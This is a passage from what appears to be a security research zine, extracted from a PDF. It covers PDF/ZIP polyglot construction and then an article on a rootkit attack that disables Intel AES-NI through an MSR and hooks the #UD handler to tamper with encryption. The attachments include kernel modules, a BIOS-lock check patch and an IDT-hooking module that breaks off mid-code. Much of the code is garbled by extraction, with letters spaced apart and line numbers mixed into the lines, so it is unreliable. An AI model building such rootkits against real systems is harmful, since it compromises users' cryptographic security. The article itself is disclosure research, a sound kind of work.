this. You can merge a PDF and an Apple II floppy image, but only if the PDF fits in the 143360–byte disk
image.
If you need a bigger size, you can try with hard disk images for the same system, if they exist. In this
case, you can put them on a two megabyte hard disk image, with partitioning as required. Thanks to Peter
Ferrie for his help with this technique, which was used to produce the polyglot in Figure 23. Shown in that
figure is an Apple II disk image of Prince of Persia that doubles as a PDF.
376.9
Challenges
Limitations of Standard Libraries Because most libraries don’t give you full control over the file
structure, abusing file formats is not always easy.
You may want to open the file and just modify one chunk, but the library—too smart for its britches—
removed your dummy chunk, recompressed your intentionally uncompressed data, optimized the colors of
your palette, and ruined other carefully chosen options. In the end, such unconventional proofs of concept
are often easier to generate with a small script made from scratch rather than relying on a well-known
bulletproof library.
Normalization To make your scripts more efficient, it might be worth finding a good normalizer program
for the filetype you’re abusing. There are lots of good programs and libraries that will not modify your file
in depth, but produce a relatively predictable structure.
For PDF, running mutool clean is a good way to sand off any rough edges in your polyglot. It modifies
very little, yet rebuilds the XREF table and adjusts objects lengths, which turns your hand-made tolerated
PDF into one that looks perfectly standard.
For PNG, advpng -z -0 is a good way to produce an uncompressed image with no line filters.
For ZIP, TorrentZip is a good way to consistently produce the exact same archive file. AdvDef is a good
way to (de)compress Zlib chunks without altering the rest of the file in any way. For example, when used
on PNGs, no PNG structure is analyzed, and just the IDAT chunks are processed.
Normalizing the content data’s range is sometimes useful, too. A sound or image that consumes its entire
dynamic range leaves more room for hidden data in the lower bits.
Compatibility
If your focus is still on getting decent compatibility, you may pull your hair a lot. The problem is not just
the limit between valid and invalid files; rather, it’s the difference between the parser thinking “Hey this is
good enough.” and “Hey, this looks corrupted so let’s try to recover what I can.”
This leads to bugs that are infuriatingly difficult to solve. For example, a single font in a PDF might
become corrupted. One image—and only one image!–might go missing. A seemingly trivial polyglot then
becomes a race against heisenbugs, where it can be very difficult to get a good compatibility rate.
Automated Generation
Although it’s possible to alter a generated file, it might be handy to make a file generator directly integrate
foreign data. This way, the foreign data will be integrated reproducibly, whereas the rest of the structure is
already one hundred percent standard.
Archives Archiving a file without any compression usually stores it as is. Please note, however, that some
archive formats will escape data in order to prevent stored data from interfering with the outer format.
PDFL A TEX PDFL A TEX has special commands to create an uncompressed stream object, directly from an
external file. This is extremely useful, and totally reliable, no matter the size of the file. This way, you can
easily embed any data in your PDF.
\ begingroup
\ p d f c o m p r e s s l e v e l =0\ r e l a x
\immediate\ p d f o b j s t r e a m
4
f i l e { foo . bin }
\endgroup
2
38Figure 24: a PDFL A TEX/PDF quine
A PDFL A TEX/PDF Polyglot If your document’s source is a single .tex file, then you can make a
PDFL A TEX quine. This file is simultaneously its own TEX source code and the resulting PDF from compi-
lation. If your document is made of multiple files, then you can archive those files to bundle them in the
PDF.
You can also do it the other way around. For his Zeronights 2014 keynote, Is infosec a game?, Solar
Designer created an actual point and click adventure to walk through the presentation. 30
It would be a shame if such a masterpiece were lost, so he made his own walkthrough as screenshots, put
together as a slideshow in a PDF, in which the ZIP containing the game is attached. This way, it’s preserved
as a single file, containing an easy preview of the talk itself and the original presentation material.
Embedding a ZIP in a PDF However, if you embed a ZIP in a PDF as a simple PDF object, it’s
possible that the ZIP footer will be too far from the end of the file. Objects are stored before the Cross
Reference table, which typically grows linearly with the number of objects in the PDF. When this happens,
ZIP tools might fail to see the ZIP.
A good way to embed a ZIP in a PDF, as Julia Wolf showed us with napkins in PoCkGTFO 1:5, is to
create a fake stream object after the xref, where the trailer object is present, before the startxref pointer.
The official specifications don’t specify that no extra object should be present. Since the trailer object itself
is just a dictionary, it uses mostly the same syntax as any other PDF objects, and all parsers tolerate an
extra object present within this area.
1. PDF Signature
2. PDF Objects
3. Cross Reference Table
4. (extra stream object declaration)
• ZIP Archive
5. Trailer Object
6. startxref Pointer
30 http://www.openwall.com/presentations/ZeroNights2014-Is-Infosec-A-Game/
39This gives a fully compatible PDF, with no need for pointer or length adjustment. It’s also a straight-
forward way for academics to bundle source code and PoCs.
Appended Data If for some reason you need the ZIP at the exact bottom of the file, e.g. to maintain
compatibility with Python’s EGG format, then you can extend the ZIP footer’s comment to cover the last
bytes of the PDF. This footer, called the End of Central Directory, starts with P K 05 06 and ends with a
variable length comment. The length is at offset 20, then the comment itself starts at offset 22.
If the ZIP is too far from the bottom of the file, then this operation is not possible as the comment
would be longer than 65536 bytes. Instead, to increase compatibility, one can duplicate the End of Central
Directory. I describe this trick in PoCkGTFO 4:11, where it was used to produce a Truecrypt/PDF/ZIP
polyglot.
Combined with the trailing space trick explained earlier, one can insert an actual null-terminated string
before the extraneous data so ZIP parsers will display a proper comment instead of some garbage!
Fixing Absolute Pointers When an unmodified ZIP is inserted into a PDF, the pointers inside the ZIP’s
structures are only valid relative to the start of the archive. They are not correct as seen from the file itself.
Some tools consider such a file to be damaged, with garbage to ignore, but some might refuse to parse it
with incorrect addresses. To fix this, adjust the relative offset of local header pointers in the Central
Directory’s entries. You might also ask a ZIP tool to repair the file, and cross your fingers that your tool
will not alter anything else in the file by reordering files or removing slack space.
6.10
Thoughts
Polyglots Polyglot files may sound like a great idea for production. For example, you can keep the original
(custom format) source file of a document embedded in a file that can be seen as a preview in a standard
format. To quickly sort your SVG files, just ZIP them individually and append them to a PNG showing the
preview.
As mentioned previously, ZIP your .tex files and embed them in the final PDF. This already exists in
some cases, such as OpenOffice’s ability to export PDF files that contain the original .odt file internally.
A possible further use of polyglots would be to bundle different outputs of the same file in two different
formats. PDF and EPUB could be combined for e-book distribution, or a installer could be used for both
Linux and Windows. Naturally, we could just ZIP these together and distribute the archive, but they won’t
be usable out of the box.
Archiving files together is much more natural than making a polyglot file. Although opening a polyglot
file may be transparent for the targeted software, it’s not a natural action for user.
There are also security risks associated with polyglot construction. For example, polyglots can be used
to exfiltrate data or bypass intrusion detection systems. Testing various polyglots on Encase showed that
nearly all of them were reported as a single file type, with no warnings whatsoever.
Offset Start I see no point in allowing a magic signature to be at any offset. If it’s for the sake of allowing
a comment early in the file, then the format itself should have an explicit comment chunk.
If it’s for the sake of bundling several file types together, then as mentioned previously, it could just be
specific to one application. There’s no need to waste parsing time in making it officially a part of one format.
I don’t see why a PE with ZIP in appended data should still be considered to be a standard ZIP; jumping
at the end of the PE’s physical size is not hard, neither is extracting a ZIP, so why does it sound normal
that it still works directly as a ZIP? If a user updates the contents of the archive, it’s quite possible that the
ZIP tool would re-create an entire archive without the initial PE data.
While it’s helpful to manually open WinZip/WinRar/7Z self–extracting archives, you still have to run a
dedicated tool for formats such as Nullsoft Installer and InnoSetup that have no standard tool. Sure, your
extraction tool could just look for data anywhere like Binwalk, but this exceptional case doesn’t justify the
fact that the format explicitly allows any starting offset.
40This is likely why some modern tools take a different approach, ignoring the official structure of a ZIP.
These extractors start at offset zero and look for a sequence of Local File Headers. This method is faster
than the official bottom-up method of parsing, and it works fine for 99% of standard files out there.
Sadly, doing this differently makes ZIP schizophrenia possible, which can be critical as it can break
signatures and the complete chain of trust of a standard system.
And yet, how hard would it be to create a new, top-down, smaller Zlib-based archive format, one that
doesn’t contain obsolete fields such as number of volumes of the archive? One that doesn’t duplicate
file names between Central Directory and Local File Headers?
Enforcing Values File structures are like laws: when they are overly complicated and unnecessary, peo-
ple will ignore them. The PE file format now has tons of deprecated fields and structures, especially by
comparison to its long overdue sibling, the Terse Executable file format. TE is essentially the same format,
with a lot of obsolete fields removed.
From especially unclear specifications come diverging implementations, slightly different for each pro-
grammer’s interpretation. The ZIP specifications 31 don’t even specify the names of the various fields in the
structures, only a long description for each of them, such as compression method! Once enough diverging
implementations survive, then hard reality merges them into an ugly de facto standard. We end up with
tools that are forced to recover half-broken files rather than strictly accepting what’s okay. They give us
mere warnings when the input is unclear, rather than rejecting what’s against the rules.
6.11
Conclusion
Let me know if I forgot anything. Suggestions and corrections are more than welcome! I hope this gives you
ideas, that it makes you want to explore further. Our attentive readers will notice that compressions and
file systems are poorly represented—except for the amazing MIT Mystery Hunt image—and indeed, that’s
what I will explore next.
Some people accuse these file format tricks of being pointless shenanigans, which is true! These tricks
are useless, but only until someone uses one of them to bypass a security layer. At that point everyone will
acknowledge that they were worth knowing before, but by then it’s too late. It’s better to know in advance
about potential risks than judge blindly that ‘nobody was ever pwned with such a trick’.
As a closing note, don’t forget the two great mantras of research and security. First, to stay safe, don’t do
anything. Second, to make nifty new discoveries, try everything!
31 https://pkware.cachefly.net/webdocs/APPNOTE/APPNOTE-6.3.3.TXT
417
Extending crypto-related backdoors to other scenarios
by BSDaemon and Pirata
This article expands on the ideas introduced by Taylor Hornby’s “Prototyping an RDRAND Backdoor
in Bochs” in PoCkGTFO 3:6. That article demonstrated the dangers of using instructions that generate a
#VMEXIT event while in a guest virtual machine. Because a malicious VMM could compromise the randomness
returned to a guest VM, it can affect the security of cryptographic operations.
In this article, we demonstrate that the newly available AES-NI instruction extensions in Intel platforms
are vulnerable to a similar attack, with some additional badness. Not only guest VMs are vulnerable, but
normal user-level/kernel-level applications that leverage the new instruction set are vulnerable as well, unless
proper measures are in place. The reason for that is due to a mostly unknown feature of the platform, the
ability to disable this instruction set.
7.1
Introduction
From Intel’s website, 32 :
Intel AES-NI is a new encryption instruction set that improves on the Advanced Encryption
Standard (AES) algorithm and accelerates the encryption of data in the Intel Xeon processor
family and the Intel Core processor family.
The instruction has been available since 2010. 33
Starting in 2010 with the Intel Core processor family based on the 32nm Intel micro-architecture,
Intel introduced a set of new AES (Advanced Encryption Standard) instructions. This processor
launch brought seven new instructions. As security is a crucial part of our computing lives,
Intel has continued this trend and in 2012 and [sic] has launched the 3rd Generation Intel Core
Processors, codenamed Ivy Bridge. Moving forward, 2014 Intel micro-architecture code name
Broadwell will support the RDSEED instruction.
On a Linux box, a simple grep would tell if the instruction is supported in your machine.
1 bsdaemon@bsdaemon . o r g : ~# g r e p a e s / proc / c p u i n f o
flags
: f p u vme de p s e t s c msr pae mce cx8 a p i c s e p mtrr pge mca cmov
3 p a t p s e 3 6 c l f l u s h d t s a c p i mmx f x s r s s e s s e 2 s s ht tm pbe s y s c a l l nx r d t s c p lm
c o n s t a n t _ t s c arch_perfmon p e b s b t s rep_good n o p l x t o p o l o g y n o n s t o p _ t s c
5 a p e r f m p e r f e a g e r f p u p n i pclmulqdq d t e s 6 4 m o n i t o r ds_cpl vmx smx e s t tm2 s s s e 3
cx16 x t p r pdcm p c i d sse4_1 sse4_2 x 2 a p i c popcnt t s c _ d e a d l i n e _ t i m e r a e s x s a v e avx
7 f 1 6 c r d r a n d lahf_lm i d a a r a t epb x s a v e o p t p l n p t s dtherm tpr_shadow vnmi
f l e x p r i o r i t y e p t v p i d f s g s b a s e smep erms
A little-known fact, though, is that the instruction set can be disabled using an internal MSR on the
processor. It came to our attention while we were looking at BIOS update issues and saw a post about a
machine with AES-NI showing as disabled even though it was in, fact, supported. 34
Researching the topic, we came across the MSR for a Broadwell Platform: 0x13C. It will vary for each
processor generation, but it is the same in Haswell and SandyBridge, according to our tests. Our machine
had it locked.
MSR 0x13C
2 Bit
Description
0
Lock b i t ( a l w a y s u n l o c k e d on b o o t time , BIOS s e t s i t )
4 1
Not d e f i n e d by d e f a u l t , 1 w i l l d i s a b l e AES−NI
2−32
Not s u r e what i t does , n o t t o u c h e d by o u r BIOS ( p r o b a b l y r e s e r v e d )
Discussing attack possibilities with a friend in another scenario—related to breaking a sandbox-like feature
in the processor—we came to the idea of using it for a rootkit.
32 http://www.intel.com/content/www/us/en/architecture-and-technology/advanced-encryption-standard–aes-/data-
protection-aes-general-technology.html
33 https://software.intel.com/en-us/node/256280.
34 “AES-NI shows Disabled”, http://en.community.dell.com/support-forums/servers/f/956/t/19509653
427.2
The Idea
All the code that we saw that supports AES-NI is basically about checking if it is supported by the processor,
via CPUID, including the reference implementations on Intel’s website. That’s why we considered the
possibility of manipulating encryption in applications by disabling the extension and emulating its expected
results. Not long after we had that thought, we read in the PoCkGTFO 3:6 about RDRAND.
If the disable bit is set, the AES-NI instructions will return #UD (Invalid Opcode Exception) when issued.
Since the code checks for the AES-NI support during initialization instead of before each call, winning the
race is easy—it’s a classic TOCTOU.
Some BIOSes will set the lock bit, thus hard-enabling the set. A write to the locked MSR then causes a
general protection fault, so there are two possible approaches to dealing with this case.
First, we can set both the disable bit and the lock bit. The BIOS tries to enable the instruction, but that
write is ignored. The BIOS tries to lock it, but it is ignored. That works unless the BIOS checks if the write
to the MSR worked or not, which is usually not the case—in the BIOS we tested, the general protection
fault handler for the BIOS just resumed execution. For beating the BIOS to this punch, one could explore
the BIOS update feature, setting the TOP_SWAP bit, which let code execute before BIOS. 35 Chipsec toolkit 36
TOP_SWAP mechanism is locked.
For a Vulnerable Machine,
1
3
5
7
### BIOS VERSION 65CN90WW
OS
: uefi
Chipset :
VID :
8086
DID :
0154
Name :
I v y B r i d g e ( IVB )
Long Name : I v y B r i d g e CPU / Panther P o i n t PCH
[ − ] FAILED : BIOS I n t e r f a c e i n c l u d i n g Top Swap Mode i s n o t l o c k e d
For a Protected Machine,
12 OS
: Linux 3.2.0 −4 −686 − pae #1 SMP Debian 3.2.65 −1+ deb7u2 i 6 8 6
P l a t f o r m : 4 th G e n e r a t i o n Core P r o c e s s o r ( H a s w e l l U/Y)
VID : 8086
DID : 0A04
CHIPSEC : 1 . 1 . 7
[ ∗ ] BIOS Top Swap mode i s d i s a b l e d
[ ∗ ] BUC = 0 x 00 000 00 0 << Backed Up C o n t r o l (RCBA + 0 x3414 )
[ 0 0 ] TS
= 0 << Top Swap
[ ∗ ] RTC v e r s i o n o f TS = 0
[ ∗ ] GCS = 0 x 00 000 02 1 << G e n e r a l C o n t r o l and S t a t u s (RCBA + 0 x3410 )
[ 0 0 ] BILD
= 1 << BIOS I n t e r f a c e Lock Down
[ 1 0 ] BBS
= 0
14 [ + ] PASSED : BIOS I n t e r f a c e
2
4
6
8
10
is
l o c k e d ( i n c l u d i n g Top Swap Mode )
The problem with this approach is that software has to check if the AES-NI is enabled or not, instead of
just assuming the platform supports it.
Second, we can NOP-out the BIOS code that locks the MSR. That works if BIOS modification is possible
on the platform, which is often the case. There are many options to reverse and patch your BIOS, but most
involve either modifying the contents of the SPI Flash chip or single-stepping with a JTAG debugger.
Because the CoreBoot folks have had all the fun there is with SPI Flash, and because folk wisdom says
that JTAG isn’t feasible on Intel, we decided to throw folk wisdom out the window and go the JTAG route.
We used the Intel JTAG debugger and an XDP 3 device. The algorithm used is provided in the attachment 3.
To be able to set this MSR, one needs Ring0 access, so this attack can be leveraged by a hypervisor
against a guest virtual machine, similar to the RDRAND attack. But what’s interesting in this case is that it
can also be leveraged by a Ring0 application against a hypervisor, guest, or any host application! We used
a Linux Kernel Module to intercept the #UD; a sample prototype of that module is in attachment 6.
35 “Using
SMM for other purposes”, Phrack 65:7
36 https://github.com/chipsec/chipsec
437.3
Checking your system
You can use the Chipsec module that comes with this article to check if your system has the MSR locked.
Chipsec uses a kernel module that opens an interface (a device on Linux) for its user-mode component
(Python code) to request info on different elements of the platform, such as MSRs. Obviously, a kernel
module could do that directly. An example of such a module is provided with this article.
Since the MSR seems to change from system to system (and is not deeply documented by Intel itself),
we recommend searching your OEM BIOS vendor forums to try and guess what is that MSR’s number for
your platform if the value mentioned here doesn’t work. Disassembling your BIOS calls for the wrmsr might
also help. Some BIOSes offer the possibility of disabling the AES-NI set in the BIOS menu, thus making it
easier to identify the code (so dump the BIOS and diff). By default, the platform initializes with the disable
bit unset, i.e., with AES-NI enabled. In our case, the BIOS vendor only set the lock bit.
7.4
Conclusion
This article demonstrates the need for checking the platform as whole for security issues. We showed that
even “safe” software can be compromised, if the configuration of the platform’s elements is wrong (or not
ideal). Also note that forensics tools would likely fail to detect these kinds of attacks, since they typically
depend on the platform’s help to dissect software.
Acknowledgements
Neer Roggel for many excellent discussions on processor security and modern features, as well for the en-
lightening conversation about another attack based on disabling the AES-NI in the processor.
Attachment 1: Patch for Chipsec
This patch is for Chipsec (https://github.com/chipsec/chipsec) public repository version from March
9, 2015. A better (more complete) version of this patch will be incorporated into the public repository soon.
2
4
6
8
10
12
d i f f −rNup c h i p s e c −m a s t e r / s o u r c e / t o o l / c h i p s e c / c f g /hsw . xml c h i p s e c −m a s t e r . new/ s o u r c e / t o o l / c h i p s e c /
c f g /hsw . xml
−−− c h i p s e c −m a s t e r / s o u r c e / t o o l / c h i p s e c / c f g /hsw . xml 2015−01−23 1 6 : 0 7 : 1 9 . 0 0 0 0 0 0 0 0 0 −0800
+++ c h i p s e c −m a s t e r . new/ s o u r c e / t o o l / c h i p s e c / c f g /hsw . xml 2015−03−09 1 9 : 1 3 : 5 5 . 9 4 9 4 9 8 2 5 0 −0700
@@ −39 ,6 +39 ,10 @@
<!−−
−−>
<!−− #################################### −−>
<r e g i s t e r s >
+
< r e g i s t e r name="IA32_AES_NI"
t y p e="msr " msr="0 x13c " d e s c ="AES−NI Lock">
+
< f i e l d name="Lock "
b i t ="0"
s i z e ="1"
d e s c ="AES−NI Lock B i t " />
+
< f i e l d name="AESDisable " b i t ="1" s i z e ="1" d e s c ="AES−NI D i s a b l e B i t ( s e t t o d i s a b l e ) " />
+
</ r e g i s t e r >
</ r e g i s t e r s >
14 −</ c o n f i g u r a t i o n >
\ No n e w l i n e a t end o f f i l e
16 +</c o n f i g u r a t i o n >
d i f f −rNup c h i p s e c −m a s t e r / s o u r c e / t o o l / c h i p s e c / modules /hsw/ a e s _ n i . py c h i p s e c −m a s t e r . new/ s o u r c e / t o o l
/ c h i p s e c / modules /hsw/ a e s _ n i . py
18 −−− c h i p s e c −m a s t e r / s o u r c e / t o o l / c h i p s e c / modules /hsw/ a e s _ n i . py 1969−12−31 1 6 : 0 0 : 0 0 . 0 0 0 0 0 0 0 0 0 −0800
+++ c h i p s e c −m a s t e r . new/ s o u r c e / t o o l / c h i p s e c / modules /hsw/ a e s _ n i . py 2015−03−09 1 9 : 2 2 : 1 2 . 6 9 3 5 1 8 9 9 8
−0700
20 @@ −0 ,0 +1 ,68 @@
+#CHIPSEC : P l a t f o r m S e c u r i t y A s s e s s m e n t Framework
22 +#C o p y r i g h t ( c ) 2010 −2015 , I n t e l C o r p o r a t i o n
+#
24 +#T h i s program i s f r e e s o f t w a r e ; you can r e d i s t r i b u t e i t and / o r
+#modify i t under t h e t e r m s o f t h e GNU G e n e r a l P u b l i c L i c e n s e
26 +#a s p u b l i s h e d by t h e F r e e S o f t w a r e Fo und at io n ; V e r s i o n 2 .
+#
28 +#T h i s program i s d i s t r i b u t e d i n t h e hope t h a t i t w i l l be u s e f u l ,
+#but WITHOUT ANY WARRANTY; w i t h o u t even t h e i m p l i e d w a r r a n t y o f
30 +#MERCHANTABILITY o r FITNESS FOR A PARTICULAR PURPOSE.
See the
+#GNU G e n e r a l P u b l i c L i c e n s e f o r more d e t a i l s .
4432 +#
+#You s h o u l d have r e c e i v e d a copy o f t h e GNU G e n e r a l P u b l i c L i c e n s e
34 +#a l o n g w i t h t h i s program ; i f not , w r i t e t o t h e F r e e S o f t w a r e
+#Foundation , I n c . , 51 F r a n k l i n S t r e e t , F i f t h F l o o r , Boston , MA 02110 −1301 , USA .
36 +#
+#Contact i n f o r m a t i o n :
38 +#c h i p s e c @ i n t e l . com
+#
40 +
+
42 +
+
44 +## \ a d d t o g r o u p modules
+# __chipsec / modules /hsw/ a e s _ n i . py__ − c h e c k s f o r AES−NI l o c k
46 +#
+
48 +
+from c h i p s e c . module_common i m p o r t ∗
50 +from c h i p s e c . h a l . msr i m p o r t ∗
+
52 +TAGS = [MTAG_BIOS,MTAG_HWCONFIG]
+
54 +c l a s s a e s _ n i ( BaseModule ) :
+
56 +
d e f __init__ ( s e l f ) :
+
BaseModule . __init__ ( s e l f )
58 +
+
def is_supported ( s e l f ) :
60 +
r e t u r n True
+
62 +
d e f check_aes_ni_supported ( s e l f ) :
+ r e t u r n True
64 +
+
d e f check_aes_ni ( s e l f ) :
66 +
s e l f . l o g g e r . s t a r t _ t e s t ( " Checking i f AES−NI l o c k b i t i s s e t " )
+
68 +
aes_msr = c h i p s e c . c h i p s e t . r e a d _ r e g i s t e r ( s e l f . c s , ’ IA32_AES_NI ’ )
+
c h i p s e c . c h i p s e t . p r i n t _ r e g i s t e r ( s e l f . c s , ’ IA32_AES_NI ’ , aes_msr )
70 +
+ aes_msr_lock = aes_msr & 0 x1
72 +
+ # We don ’ t r e a l l y c a r e i f i t i s e n a b l e d o r n o t s i n c e t h e s o f t w a r e n e e d s t o
74 + # t e s t − t h e o n l y s e c u r i t y i s s u e i s i f i t i s n o t l o c k e d
+ a e s _ m s r _ d i s a b l e = aes_msr & 0 x2
76 +
+ # Check i f t h e l o c k i s n o t s e t , t h e n ERROR
78 + i f ( no t aes_msr_lock ) :
+
return False
80 +
+
r e t u r n True
82 +
+
# −−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−
84 +
# run ( module_argv )
+
# R e q u i r e d f u n c t i o n : run h e r e a l l t e s t s from t h i s module
86 +
# −−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−
+
d e f run ( s e l f , module_argv ) :
88 +
r e t u r n s e l f . check_aes_ni ( )
Attachment 2: Kernel Module to check and set the AES-NI related MSRs
If for some reason you can’t use Chipsec, this Linux kernel module reads the MSR and checks if the AES-NI
lock bit is set.
#include
2 #include
#include
4 #include
#include
6 #include
#include
8 #include
#include
10 #include
#include
<l i n u x / module . h>
<l i n u x / d e v i c e . h>
<l i n u x /highmem . h>
<l i n u x / k a l l s y m s . h>
<l i n u x / t t y . h>
<l i n u x / p t r a c e . h>
<l i n u x / v e r s i o n . h>
<l i n u x / s l a b . h>
<asm/ i o . h>
" include /rop . h"
<l i n u x /smp . h>
4512
#d e f i n e _GNU_SOURCE
14
#d e f i n e FEATURE_CONFIG_MSR 0 x13c
16
MODULE_LICENSE( "GPL" ) ;
18
#d e f i n e MASK_LOCK_SET
0 x00 00 00 01
20 #d e f i n e MASK_AES_ENABLED
0 x 000 00 002
#d e f i n e MASK_SET_LOCK
0 x00 00 00 00
22
void ∗ read_msr_in_c ( void ∗ CPUInfo )
24 {
int ∗ p o i n t e r ;
26
p o i n t e r =( i n t ∗ ) CPUInfo ;
asm v o l a t i l e ( "rdmsr" : "=a" ( p o i n t e r [ 0 ] ) , "=d" ( p o i n t e r [ 3 ] )
28
return NULL ;
}
30
i n t __init
32 i n i t _ m o d u l e ( void )
{
34
i n t CPUInfo [ 4 ] = { − 1 } ;
36 p r i n t k (KERN_ALERT "AES −NI t e s t i n g module\n" ) ;
38 read_msr_in_c ( CPUInfo ) ;
40
: "c" (FEATURE_CONFIG_MSR) ) ;
p r i n t k (KERN_ALERT "read : %d %d from MSR: 0x%x \n" , CPUInfo [ 0 ] , CPUInfo [ 3 ] ,
FEATURE_CONFIG_MSR) ;
42
if
( CPUInfo [ 0 ] & MASK_LOCK_SET)
p r i n t k (KERN_ALERT "MSR:
lock b i t i s s e t \n" ) ;
44
if
46
48
( ! ( CPUInfo [ 0 ] & MASK_AES_ENABLED) )
p r i n t k (KERN_ALERT "MSR: AES_DISABLED b i t i s NOT s e t − AES −NI i s ENABLED\n" ) ;
return 0 ;
}
50
void __exit
52 cleanup_module ( void )
{
54
p r i n t k (KERN_ALERT "AES −NI MSR unloading \n" ) ;
}
Attachment 3: In-target-probe (ITP) algorithm
Since we used an interface available only to Intel employees and OEM partners, we decided to at least provide
the algorithm behind what we did. We started with stopping the machine execution at the BIOS entrypoint.
We then defined some functions to be used through our code.
1
3
5
7
9
11
13
15
get_eip ( ) :
Get t h e c u r r e n t RIP
g e t _ c s ( ) : Get t h e c u r r e n t CS
get_ecx ( ) :
Get t h e c u r r e n t v a l u e o f RCX
get_opcode ( ) :
Get t h e c u r r e n t opcode ( d i s a s s e m b l y t h e c u r r e n t i n s t r u c t i o n )
find_wrmsr ( ) :
Uses t h e get_opcode ( ) t o compare w i t h t h e ’ 3 0 0 f ’ ( wrmsr opcode ) and
r e t u r n True i f f o u n d ( F a l s e i f n o t )
search_wrmsr ( ) :
w h i l e find_wrmsr ( ) == F a l s e :
s t e p ( ) −> go t o t h e n e x t i n s t r u c t i o n ( s i n g l e −s t e p )
find_aes () :
w h i l e True :
step ()
search_wrmsr ( )
i f get_ecx ( ) == ’ 0 0 0 0 0 1 3 c ’ :
p r i n t "Found AES MSR"
break
Attachment 4: AES-NI Availability Test Code
This code uses the CPUID feature to see if AES-NI is available. If disabled, it will return “AES-NI Disabled”.
This is the reference code to be used by software during initialization to probe for the feature.
461 #include < s t d i o . h>
3 #d e f i n e c p u i d ( l e v e l , a , b , c , d ) \
asm ( "xchg{ l }\ t{%%}ebx , %1\n\ t " \
5
"cpuid\n\ t " \
"xchg{ l }\ t{%%}ebx , %1\n\ t " \
7
: "=a" ( a ) , "=r" ( b ) , "=c" ( c ) , "=d" ( d ) \
: "0" ( l e v e l ) )
9
i n t main ( i n t a r g c , char ∗∗ a r g v ) {
11
unsigned i n t eax , ebx , ecx , edx ;
c p u i d ( 1 , eax , ebx , ecx , edx ) ;
13
i f ( e c x & (1<<25) )
p r i n t f ( "AES −NI Enabled\n" ) ;
15
else
p r i n t f ( "AES −NI Disabled\n" ) ;
17
return 0 ;
}
Attachment 5: AES-NI Simple Assembly Code (to trigger the #UD)
This code will run normally (exit(0) call) if AES-NI is available and will cause a #UD if not.
Section
2
. text
global _start
4 _start :
mov ebx , 0
6
mov eax , 1
a e s e n c xmm7, xmm1
8
i n t 0 x80
Attachment 6: #UD hooking
There are many ways to implement this, as ‘Handling Interrupt Descriptor Table for fun and profit” in
Phrack 59:4 shows. Another option, however, is to use Kprobes and hook the function invalid_op().
#include <l i n u x / module . h>
2 #include <l i n u x / k e r n e l . h>
4 int index = 0 ;
module_param ( i n d e x , int , 0 ) ;
6
#d e f i n e GET_FULL_ISR( low , h i g h ) ( ( ( u i n t 3 2 _ t ) ( low ) ) | ( ( ( u i n t 3 2 _ t ) ( h i g h ) ) << 1 6 ) )
8 #d e f i n e GET_LOW_ISR( addr ) ( ( u i n t 1 6 _ t ) ( ( ( u i n t 3 2 _ t ) ( addr ) ) & 0x0000FFFF ) )
#d e f i n e GET_HIGH_ISR( addr ) ( ( u i n t 1 6 _ t ) ( ( ( u i n t 3 2 _ t ) ( addr ) ) >> 1 6 ) )
10
uint32_t o r i g i n a l _ h a n d l e r s [ 2 5 6 ] ;
12 u i n t 1 6 _ t old_gs , o l d _ f s , old_es , old_ds ;
14 typedef s t r u c t _idt_gate_desc {
uint16_t o f f s e t _ l o w ;
16
uint16_t segment_selector ;
u i n t 8 _ t z e r o ; // z e r o + r e s e r v e d
18
uint8_t f l a g s ;
uint16_t o f f s e t _ h i g h ;
20 } idt_gate_desc_t ;
idt_gate_desc_t ∗ g a t e s [ 2 5 6 ] ;
22
void handler_implemented ( void ) {
24
p r i n t k (KERN_EMERG "IDT Hooked Handler\n" ) ;
}
26
void f o o ( void ) {
28
__asm__( "push %eax" ) ; // p l a c e h o l d e r f o r o r i g i n a l h a n d l e r
30
32
34
__asm__( "pushw %gs" ) ;
__asm__( "pushw %f s " ) ;
__asm__( "pushw %es " ) ;
__asm__( "pushw %ds" ) ;
__asm__( "push %eax" ) ;
4736
38
40
42
44
__asm__( "push
__asm__( "push
__asm__( "push
__asm__( "push
__asm__( "push
__asm__( "push %ebp" ) ;
%edi " ) ;
%e s i " ) ;
%edx" ) ;
%ecx" ) ;
%ebx" ) ;
__asm__( "movw
__asm__( "movw
__asm__( "movw
__asm__( "movw %0,
%0,
%0,
%0,
%%ds"
%%es "
%%f s "
%%gs"
:
:
:
:
:
:
:
:
"m" ( old_ds ) ) ;
"m" ( o l d _ e s ) ) ;
"m" ( o l d _ f s ) ) ;
"m" ( old_gs ) ) ;
46
handler_implemented ( ) ;
48
50
// p l a c e o r i g i n a l h a n d l e r i n i t s p l a c e h o l d e r
__asm__( "mov %0, %%eax" : : "m" ( o r i g i n a l _ h a n d l e r s [ i n d e x ] ) ) ;
__asm__( "mov %eax , 0x24(%esp ) " ) ;
52
54
56
58
60
62
__asm__( "pop %ebx" ) ;
__asm__( "pop %ecx" ) ;
__asm__( "pop %edx" ) ;
__asm__( "pop %e s i " ) ;
__asm__( "pop %edi " ) ;
__asm__( "pop %ebp" ) ;
__asm__( "pop %eax" ) ;
__asm__( "popw %ds" ) ;
__asm__( "popw %es " ) ;
__asm__( "popw %f s " ) ;
__asm__( "popw %gs" ) ;
64
66
// e n s u r e s t h a t " r e t " w i l l be t h e n e x t i n s t r u c t i o n f o r t h e c a s e
// c o m p i l e r adds more i n s t r u c t i o n s i n t h e e p i l o g u e
__asm__( " r e t " ) ;
68 }
70 i n t i n i t _ m o d u l e ( void ) {
// IDTR
72
unsigned char i d t r [ 6 ] ;
uint16_t i d t _ l i m i t ;
74
u i n t 3 2 _ t idt_base_addr ;
int i ;
76
__asm__( "mov %%gs , %0" :
78
__asm__( "mov %%f s , %0" :
__asm__( "mov %%es , %0" :
80
__asm__( "mov %%ds , %0" :
82
84
"=m" ( old_gs ) ) ;
"=m" ( o l d _ f s ) ) ;
"=m" ( o l d _ e s ) ) ;
"=m" ( old_ds ) ) ;
__asm__( " s i d t %0" : "=m" ( i d t r ) ) ;
i d t _ l i m i t = ∗ ( ( uint16_t ∗ ) i d t r ) ;
idt_base_addr = ∗ ( ( u i n t 3 2 _ t ∗ )&i d t r [ 2 ] ) ;
p r i n t k ( "IDT Base Address : 0x%x , IDT Limit : 0x%x\n" , idt_base_addr ,
idt_limit ) ;
86
88
g a t e s [ 0 ] = ( idt_gate_desc_t ∗ ) ( idt_base_addr ) ;
f o r ( i = 1 ; i < 2 5 6 ; i ++)
